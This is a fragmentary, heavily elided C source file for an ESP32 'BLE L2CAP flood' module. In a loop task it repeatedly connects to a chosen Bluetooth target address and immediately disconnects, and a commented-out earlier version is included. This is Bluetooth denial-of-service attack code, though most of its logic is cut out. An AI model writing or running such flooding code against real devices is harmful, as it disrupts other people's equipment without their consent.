// /* BLE L2CAP flood - controlled connect/disconnect placeholder */
...
// static const char *TAG = "ble_l2cap";
...
// static int conn_cb(struct ble_gap_event *event, void *arg) {
//     switch (event->type) {
//         case BLE_GAP_EVENT_CONNECT:
//             if (event->connect.status == 0) {
//                 ESP_LOGI(TAG, "L2CAP task: connected conn_handle=%d", event->connect.conn_handle);
//                 // Immediately terminate to avoid long-lived connections
//                 ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
//             } else {
//                 ESP_LOGW(TAG, "L2CAP task: connect failed status=%d", event->connect.status);
//             }
//             break;
//         case BLE_GAP_EVENT_DISCONNECT:
//             ESP_LOGI(TAG, "L2CAP task: disconnected reason=%d", event->disconnect.reason);
//             break;
//         default:
//             break;
//     }
...
//         ESP_LOGI(TAG, "L2CAP attempt to %s", copy);
//         uint8_t own_addr_type = ble_common_own_addr_type();
//         int rc = ble_gap_connect(own_addr_type, &peer, 3000, NULL, conn_cb, NULL);
//         if (rc && rc != BLE_HS_EALREADY) ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
...
//     ESP_LOGI(TAG, "ble_l2cap initialized (placeholder)");
// }
...
//     xSemaphoreGive(mutex);
//     running = true;
//     xTaskCreate(l2cap_task, "ble_l2cap", 4096, NULL, 5, &task_handle);
// }
...
static int conn_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
        case BLE_GAP_EVENT_CONNECT:
            if (event->connect.status == 0) {
                ESP_LOGI(TAG, "L2CAP task: connected conn_handle=%d",
                ...
                ESP_LOGW(TAG, "L2CAP task: connect failed status=%d",
        ...
        case BLE_GAP_EVENT_DISCONNECT:
            ESP_LOGI(TAG, "L2CAP task: disconnected reason=%d",
        ...
        case BLE_GAP_EVENT_CONN_UPDATE:
            ESP_LOGD(TAG, "Connection update; status=%d",
...
static void l2cap_task(void *arg) {
    ...
    while (running) {
        ...
        ESP_LOGI(TAG, "L2CAP attempt to %s (addr_type=%s)",
    ...
    ESP_LOGI(TAG, "L2CAP flood task exiting");
    task_handle = NULL;
...
void ble_l2cap_flood_init(void) {
    ...
    ESP_LOGI(TAG, "ble_l2cap initialized");
}
...
void ble_l2cap_start(const char *target_addr) {
    ...
    BaseType_t ret = xTaskCreate(l2cap_task, "ble_l2cap", 4096, NULL, 5, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create l2cap task");
        running = false;
    }
}
